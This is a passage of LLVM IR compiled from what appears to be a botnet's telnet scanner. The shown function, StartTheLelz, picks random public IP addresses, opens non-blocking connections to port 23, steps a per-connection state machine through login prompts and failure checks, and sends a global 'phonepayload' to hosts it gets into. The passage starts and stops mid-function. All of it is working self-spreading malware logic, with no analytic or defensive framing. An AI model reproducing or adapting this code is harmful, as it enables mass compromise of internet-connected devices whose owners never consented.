; <label>:609:                                    ; preds = %600, %591
  br label %695

; <label>:610:                                    ; preds = %79
  %611 = load i32, i32* %2, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %613, i32 0, i32 0
  %615 = load i32, i32* %614, align 16
  %616 = call i64 @send(i32 %615, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.306, i32 0, i32 0), i64 12, i32 16384)
  %617 = icmp slt i64 %616, 0
  br i1 %617, label %618, label %627

; <label>:618:                                    ; preds = %610
  %619 = load i32, i32* %2, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %620
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %621, i32 0, i32 2
  store i8 0, i8* %622, align 8
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 3
  store i8 1, i8* %626, align 1
  br label %696

; <label>:627:                                    ; preds = %610
  %628 = load i32, i32* %2, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 2
  store i8 10, i8* %631, align 8
  br label %695

; <label>:632:                                    ; preds = %79
  %633 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %634 = load i32, i32* %2, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %635
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %636, i32 0, i32 7
  store i32 %633, i32* %637, align 16
  %638 = load i32, i32* %2, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 16
  %643 = load i8*, i8** @phonepayload, align 8
  %644 = load i8*, i8** @phonepayload, align 8
  %645 = call i64 @strlen(i8* %644) #10
  %646 = call i64 @send(i32 %642, i8* %643, i64 %645, i32 16384)
  %647 = icmp slt i64 %646, 0
  br i1 %647, label %648, label %663

; <label>:648:                                    ; preds = %632
  %649 = load i32, i32* %2, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %650
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 16
  %654 = call i32 @sclose(i32 %653)
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 2
  store i8 0, i8* %658, align 8
  %659 = load i32, i32* %2, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 3
  store i8 1, i8* %662, align 1
  br label %696

; <label>:663:                                    ; preds = %632
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 3
  store i8 3, i8* %667, align 1
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 7
  %672 = load i32, i32* %671, align 16
  %673 = add i32 %672, 60
  %674 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %675 = icmp ult i32 %673, %674
  br i1 %675, label %676, label %694

; <label>:676:                                    ; preds = %663
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 3
  %681 = load i8, i8* %680, align 1
  %682 = zext i8 %681 to i32
  %683 = icmp ne i32 %682, 3
  br i1 %683, label %684, label %685

; <label>:684:                                    ; preds = %676
  br label %685

; <label>:685:                                    ; preds = %684, %676
  %686 = load i32, i32* %2, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 2
  store i8 0, i8* %689, align 8
  %690 = load i32, i32* %2, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %691
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %692, i32 0, i32 3
  store i8 1, i8* %693, align 1
  br label %694

; <label>:694:                                    ; preds = %685, %663
  br label %695

; <label>:695:                                    ; preds = %694, %627, %609, %554, %536, %470, %452, %397, %379, %328, %185, %79
  br label %696

; <label>:696:                                    ; preds = %695, %648, %618, %590, %545, %517, %461, %433, %388, %360, %288, %284, %138
  %697 = load i32, i32* %2, align 4
  %698 = add nsw i32 %697, 1
  store i32 %698, i32* %2, align 4
  br label %62

; <label>:699:                                    ; preds = %62
  br label %60
                                                  ; No predecessors!
  ret void
}

declare i32 @time(...) #4

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [128 x i8], align 16
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [256 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i32 10, i32* %7, align 4
  store i32 1000, i32* %8, align 4
  %21 = load i32, i32* %8, align 4
  store i32 %21, i32* %9, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @rand_cmwc()
  %24 = xor i32 %22, %23
  call void @srand(i32 %24) #5
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 zeroext 23) #13
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 8, i32 4, i1 false)
  %30 = call noalias i8* @malloc(i64 513) #5
  store i8* %30, i8** %15, align 8
  %31 = load i8*, i8** %15, align 8
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 513, i32 1, i1 false)
  %32 = load i32, i32* %9, align 4
  %33 = zext i32 %32 to i64
  %34 = call i8* @llvm.stacksave()
  store i8* %34, i8** %17, align 8
  %35 = alloca %struct.telstate_t, i64 %33, align 16
  %36 = bitcast %struct.telstate_t* %35 to i8*
  %37 = load i32, i32* %9, align 4
  %38 = sext i32 %37 to i64
  %39 = mul i64 %38, 5
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 %39, i32 16, i1 false)
  store i32 0, i32* %1, align 4
  br label %40

; <label>:40:                                     ; preds = %58, %0
  %41 = load i32, i32* %1, align 4
  %42 = load i32, i32* %9, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %40
  %45 = load i32, i32* %1, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %46
  %48 = bitcast %struct.telstate_t* %47 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 32, i32 16, i1 false)
  %49 = load i32, i32* %1, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %50
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i32 0, i32 3
  store i8 1, i8* %52, align 1
  %53 = load i8*, i8** %15, align 8
  %54 = load i32, i32* %1, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %55
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %56, i32 0, i32 9
  store i8* %53, i8** %57, align 8
  br label %58

; <label>:58:                                     ; preds = %44
  %59 = load i32, i32* %1, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %1, align 4
  br label %40

; <label>:61:                                     ; preds = %40
  store i32 0, i32* %3, align 4
  br label %62

; <label>:62:                                     ; preds = %69, %61
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = icmp ne i8* %67, null
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %62

; <label>:70:                                     ; preds = %62
  br label %71

; <label>:71:                                     ; preds = %743, %70
  br label %72

; <label>:72:                                     ; preds = %71
  store i32 0, i32* %1, align 4
  br label %73

; <label>:73:                                     ; preds = %740, %72
  %74 = load i32, i32* %1, align 4
  %75 = load i32, i32* %9, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %743

; <label>:77:                                     ; preds = %73
  %78 = load i32, i32* %1, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 7
  %82 = load i32, i32* %81, align 16
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %77
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %86 = load i32, i32* %1, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 7
  store i32 %85, i32* %89, align 16
  br label %90

; <label>:90:                                     ; preds = %84, %77
  %91 = load i32, i32* %1, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 2
  %95 = load i8, i8* %94, align 8
  %96 = zext i8 %95 to i32
  switch i32 %96, label %739 [
    i32 0, label %97
    i32 1, label %232
    i32 2, label %330
    i32 3, label %375
    i32 4, label %420
    i32 5, label %465
    i32 6, label %510
    i32 7, label %608
  ]

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* %1, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 3
  %102 = load i8, i8* %101, align 1
  %103 = icmp ne i8 %102, 0
  br i1 %103, label %104, label %124

; <label>:104:                                    ; preds = %97
  %105 = load i32, i32* %1, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 9
  %109 = load i8*, i8** %108, align 8
  store i8* %109, i8** %18, align 8
  %110 = load i32, i32* %1, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %111
  %113 = bitcast %struct.telstate_t* %112 to i8*
  call void @llvm.memset.p0i8.i64(i8* %113, i8 0, i64 32, i32 16, i1 false)
  %114 = load i8*, i8** %18, align 8
  %115 = load i32, i32* %1, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 9
  store i8* %114, i8** %118, align 8
  %119 = call i32 @getRandomPublicIP()
  %120 = load i32, i32* %1, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 1
  store i32 %119, i32* %123, align 4
  br label %172

; <label>:124:                                    ; preds = %97
  %125 = load i32, i32* %1, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 3
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %171

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %1, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 5
  %137 = load i8, i8* %136, align 1
  %138 = add i8 %137, 1
  store i8 %138, i8* %136, align 1
  %139 = load i32, i32* %1, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 4
  %143 = load i8, i8* %142, align 2
  %144 = add i8 %143, 1
  store i8 %144, i8* %142, align 2
  %145 = load i32, i32* %1, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 5
  %149 = load i8, i8* %148, align 1
  %150 = zext i8 %149 to i64
  %151 = icmp eq i64 %150, 1
  br i1 %151, label %152, label %157

; <label>:152:                                    ; preds = %132
  %153 = load i32, i32* %1, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 3
  store i8 1, i8* %156, align 1
  br label %740

; <label>:157:                                    ; preds = %132
  %158 = load i32, i32* %1, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 4
  %162 = load i8, i8* %161, align 2
  %163 = zext i8 %162 to i64
  %164 = icmp eq i64 %163, 1
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %157
  %166 = load i32, i32* %1, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 3
  store i8 1, i8* %169, align 1
  br label %740

; <label>:170:                                    ; preds = %157
  br label %171

; <label>:171:                                    ; preds = %170, %124
  br label %172

; <label>:172:                                    ; preds = %171, %104
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %173, align 4
  %174 = call zeroext i16 @htons(i16 zeroext 23) #13
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %174, i16* %175, align 2
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %177 = getelementptr inbounds [8 x i8], [8 x i8]* %176, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %177, i8 0, i64 8, i32 4, i1 false)
  %178 = load i32, i32* %1, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %183, i32 0, i32 0
  store i32 %182, i32* %184, align 4
  %185 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %186 = load i32, i32* %1, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  store i32 %185, i32* %189, align 16
  %190 = load i32, i32* %1, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 16
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %196, label %197

; <label>:196:                                    ; preds = %172
  br label %740

; <label>:197:                                    ; preds = %172
  %198 = load i32, i32* %1, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = load i32, i32* %1, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 0
  %207 = load i32, i32* %206, align 16
  %208 = call i32 (i32, i32, ...) @fcntl(i32 %207, i32 3, i8* null)
  %209 = or i32 %208, 2048
  %210 = call i32 (i32, i32, ...) @fcntl(i32 %202, i32 4, i32 %209)
  %211 = load i32, i32* %1, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 16
  %216 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %217 = call i32 @connect(i32 %215, %struct.sockaddr* %216, i32 16)
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %219, label %227

; <label>:219:                                    ; preds = %197
  %220 = call i32* @__errno_location() #13
  %221 = load i32, i32* %220, align 4
  %222 = icmp ne i32 %221, 115
  br i1 %222, label %223, label %227

; <label>:223:                                    ; preds = %219
  %224 = load i32, i32* %1, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %225
  call void @reset_telstate(%struct.telstate_t* %226)
  br label %231

; <label>:227:                                    ; preds = %219, %197
  %228 = load i32, i32* %1, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %229
  call void @advance_state(%struct.telstate_t* %230, i32 1)
  br label %231

; <label>:231:                                    ; preds = %227, %223
  br label %739

; <label>:232:                                    ; preds = %90
  br label %233

; <label>:233:                                    ; preds = %232
  %234 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %235 = getelementptr inbounds [16 x i64], [16 x i64]* %234, i64 0, i64 0
  %236 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %235) #5, !srcloc !7
  %237 = extractvalue { i64, i64* } %236, 0
  %238 = extractvalue { i64, i64* } %236, 1
  %239 = trunc i64 %237 to i32
  store i32 %239, i32* %19, align 4
  %240 = ptrtoint i64* %238 to i64
  %241 = trunc i64 %240 to i32
  store i32 %241, i32* %20, align 4
  br label %242

; <label>:242:                                    ; preds = %233
  br label %243

; <label>:243:                                    ; preds = %242
  %244 = load i32, i32* %1, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = srem i32 %248, 64
  %250 = zext i32 %249 to i64
  %251 = shl i64 1, %250
  %252 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %253 = load i32, i32* %1, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %254
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 16
  %258 = sdiv i32 %257, 64
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds [16 x i64], [16 x i64]* %252, i64 0, i64 %259
  %261 = load i64, i64* %260, align 8
  %262 = or i64 %261, %251
  store i64 %262, i64* %260, align 8
  %263 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %263, align 8
  %264 = load i32, i32* %7, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %265, i64* %266, align 8
  %267 = load i32, i32* %1, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = add nsw i32 %271, 1
  %273 = call i32 @select(i32 %272, %struct.__sigset_t* null, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.timeval* %11)
  store i32 %273, i32* %2, align 4
  %274 = load i32, i32* %2, align 4
  %275 = icmp eq i32 %274, 1
  br i1 %275, label %276, label %308

; <label>:276:                                    ; preds = %243
  store i32 4, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %277 = load i32, i32* %1, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %278
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 16
  %282 = bitcast i32* %13 to i8*
  %283 = call i32 @getsockopt(i32 %281, i32 1, i32 4, i8* %282, i32* %12) #5
  %284 = load i32, i32* %13, align 4
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %276
  %287 = load i32, i32* %1, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %288
  call void @reset_telstate(%struct.telstate_t* %289)
  br label %307

; <label>:290:                                    ; preds = %276
  %291 = load i32, i32* %1, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = load i32, i32* %1, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = call i32 (i32, i32, ...) @fcntl(i32 %300, i32 3, i8* null)
  %302 = and i32 %301, -2049
  %303 = call i32 (i32, i32, ...) @fcntl(i32 %295, i32 4, i32 %302)
  %304 = load i32, i32* %1, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %305
  call void @advance_state(%struct.telstate_t* %306, i32 2)
  br label %307

; <label>:307:                                    ; preds = %290, %286
  br label %740

; <label>:308:                                    ; preds = %243
  %309 = load i32, i32* %2, align 4
  %310 = icmp eq i32 %309, -1
  br i1 %310, label %311, label %315

; <label>:311:                                    ; preds = %308
  %312 = load i32, i32* %1, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %313
  call void @reset_telstate(%struct.telstate_t* %314)
  br label %740

; <label>:315:                                    ; preds = %308
  br label %316

; <label>:316:                                    ; preds = %315
  %317 = load i32, i32* %1, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 7
  %321 = load i32, i32* %320, align 16
  %322 = add i32 %321, 3
  %323 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %324 = icmp ult i32 %322, %323
  br i1 %324, label %325, label %329

; <label>:325:                                    ; preds = %316
  %326 = load i32, i32* %1, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %327
  call void @reset_telstate(%struct.telstate_t* %328)
  br label %329

; <label>:329:                                    ; preds = %325, %316
  br label %739

; <label>:330:                                    ; preds = %90
  %331 = load i32, i32* %1, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = load i32, i32* %7, align 4
  %337 = load i32, i32* %1, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 9
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @read_until_response(i32 %335, i32 %336, i8* %341, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %343 = icmp ne i32 %342, 0
  br i1 %343, label %344, label %361

; <label>:344:                                    ; preds = %330
  %345 = load i32, i32* %1, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 9
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @contains_fail(i8* %349)
  %351 = icmp ne i32 %350, 0
  br i1 %351, label %352, label %356

; <label>:352:                                    ; preds = %344
  %353 = load i32, i32* %1, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %354
  call void @advance_state(%struct.telstate_t* %355, i32 0)
  br label %360

; <label>:356:                                    ; preds = %344
  %357 = load i32, i32* %1, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %358
  call void @advance_state(%struct.telstate_t* %359, i32 3)
  br label %360

; <label>:360:                                    ; preds = %356, %352
  br label %740

; <label>:361:                                    ; preds = %330
  %362 = load i32, i32* %1, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 7
  %366 = load i32, i32* %365, align 16
  %367 = add i32 %366, 3
  %368 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %369 = icmp ult i32 %367, %368
  br i1 %369, label %370, label %374

; <label>:370:                                    ; preds = %361
  %371 = load i32, i32* %1, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %372
  call void @reset_telstate(%struct.telstate_t* %373)
  br label %374

; <label>:374:                                    ; preds = %370, %361
  br label %739

; <label>:375:                                    ; preds = %90
  %376 = load i32, i32* %1, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 16
  %381 = load i32, i32* %1, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %382
